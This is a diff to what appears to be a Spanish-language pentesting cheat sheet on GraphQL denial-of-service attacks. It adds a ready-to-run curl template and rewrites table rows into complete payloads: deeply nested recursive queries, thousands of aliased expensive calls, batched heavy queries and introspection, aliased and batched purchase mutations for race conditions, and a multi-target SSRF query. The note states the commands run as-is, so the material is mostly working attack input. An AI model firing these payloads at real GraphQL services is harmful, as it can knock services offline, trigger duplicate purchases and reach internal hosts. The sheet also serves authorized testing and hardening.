@@ -18,6 +18,11 @@ linked:
 ---
 # GraphQL - DoS
 
+> [!tip] Comando base
+> Los payloads `{"query":...}` se lanzan con:
+> `curl -sX POST -H 'Content-Type: application/json' -d '<BODY>' https://target/graphql`
+> Las filas con `sqlmap`, `curl`, `echo` o loops bash son comandos completos ejecutables tal cual.
+
 ---
 
 ## Deeply Nested Queries (Recursión)
@@ -28,8 +33,9 @@ linked:
 | `{"query":"{user{friends{friends{friends{friends{friends{name}}}}}}}"}` | Friend-of-friend explosion | Self-referencing relations. |
 | `{"query":"{users(first:1000){posts(first:1000){comments(first:1000){body}}}}"}` | N³ resolves (10⁹ ops) | Pagination sin limit. |
 | `{"query":"{me{manager{manager{manager{manager{name}}}}}}"}` | Self-ref recursion | Type con field a sí mismo. |
-| `time curl -X POST -d '{"query":"..."}' https://target/graphql` | Mide latencia → confirma DoS | Pre-attack check. |
-| Bash loop generando query con N niveles → ver code block | Genera payload arbitrariamente profundo | Auto-tune depth. |
+| `time curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{me{friends{friends{friends{friends{name}}}}}}"}' https://target/graphql` | Mide latencia → confirma DoS | Pre-attack check. |
+
+Para profundidad arbitraria (auto-tune): ver **Generador nested query (bash)** abajo.
 ^graphql-dos-nested
 
 ### Generador nested query (bash)
@@ -55,10 +61,10 @@ curl -X POST -H "Content-Type: application/json" \
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `{"query":"{a1:expensiveQuery(id:1){result} a2:expensiveQuery(id:2){result}}"}` | 2+ resolves single query | Aliases sin limit. |
-| Bash genera 10000 aliases → ver code block | DB pool exhaustion / memory blow-up | Sin alias limit defense. |
 | `{"query":"{a:fetch(url:\"http://t1\") b:fetch(url:\"http://t2\") c:fetch(url:\"http://t3\")}"}` | Multi-target SSRF en 1 request | Combine con SSRF resolver. |
-| Aliases bruteforce login (ver Auth y Lógica) | Rate limit bypass + DoS combo | Login resolver pesado. |
 | `{"query":"mutation{a:expensiveMutation b:expensiveMutation c:expensiveMutation}"}` | Aliased mutations en paralelo | Race conditions + DoS. |
+
+Para 10000 aliases sobre un resolver caro (DB pool exhaustion): ver **Generador aliases overload (bash)** abajo. Combo con login brute: ver [[GraphQL - Auth y Logica]].
 ^graphql-dos-aliases
 
 ### Generador aliases overload (bash)
@@ -84,10 +90,10 @@ curl -X POST -H "Content-Type: application/json" \
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `{"query":"{user{id id id id id}}"}` con N repeticiones | Engine no deduplica → N resolves | Engine viejo. |
-| Array batch `[{q1},{q2},...,{qN}]` con N=1000 queries pesadas | Single request → N ejecuciones | Spec batching habilitado. |
-| `{"query":"{__schema{...}}"}` × 100 batched | Heavy introspection compute | Introspection no deshabilitada. |
-| `[{"query":"mutation{purchase(id:1)}"},{"query":"mutation{purchase(id:1)}"},...]` | Race conditions + DoS combo | Mutations idempotentes pero costosas. |
+| `{"query":"{user{id id id id id id id id id id}}"}` | Engine no deduplica → N resolves del mismo field | Engine viejo. |
+| `[{"query":"{expensiveQuery{result}}"},{"query":"{expensiveQuery{result}}"}]` (×1000) | Single request → N ejecuciones de query pesada | Spec batching habilitado. |
+| `[{"query":"{__schema{types{name}}}"},{"query":"{__schema{types{name}}}"}]` (×100) | Heavy introspection compute repetido | Introspection no deshabilitada. |
+| `[{"query":"mutation{purchase(id:1)}"},{"query":"mutation{purchase(id:1)}"}]` (×N) | Race conditions + DoS combo | Mutations idempotentes pero costosas. |
 | `{"query":"{usrA usrB usrC ... usr10000}"}` con 10k field nonexistent | Suggestions engine sobrecarga | "Did you mean" enabled. |
 ^graphql-dos-batching
 
